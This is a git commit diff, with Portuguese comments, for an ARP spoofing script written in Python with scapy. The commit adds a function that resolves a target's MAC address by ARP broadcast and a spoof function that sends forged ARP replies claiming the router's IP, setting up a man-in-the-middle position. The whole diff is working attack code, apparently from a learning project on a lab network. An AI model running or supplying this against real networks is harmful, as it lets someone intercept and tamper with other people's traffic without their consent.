86ce98205b056446f5945f2246ac84dabf57f77f
Mariacmv <mariaclaragmviana@gmail.com>
2025-10-21 15:33:30 -0300

    Pegando o endereço MAC automaticamente através do endereço ip

--- ARP_Spoofer/arp_spoof.py
+++ ARP_Spoofer/arp_spoof.py
@@ -2,6 +2,17 @@
 
 import scapy.all as scapy
 
-#cria o pacote arp
-packet = scapy.ARP(op=2, pdst="10.0.2.7", hwpdst="08:00:27:08:af:07", psrc="10.0.2.1") #estou dizendo a vítima: eu tenho o endereço do roteador
-scapy.send(packet) #enviando o pacote
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst=ip)  
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") 
+    arp_request_broadcast = broadcast/arp_request
+    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+
+    return answered_list[0][1].hwsrc #pego apenas o primeiro elemento e mais oq exatamente?
+
+def spoof(target_ip, spoof_ip): #recebe o ip alvo e o ip que servirá como man-in-the-middle
+    target_mac = get_mac(target_ip) #chamo a função aqui afim de pegar o endereço mac automaticamente
+    #cria o pacote arp
+    packet = scapy.ARP(op=2, pdst=target_ip, hwpdst=target_mac, psrc=spoof_ip) #estou dizendo a vítima: eu tenho o endereço do roteador
+    scapy.send(packet) #enviando o pacote
+
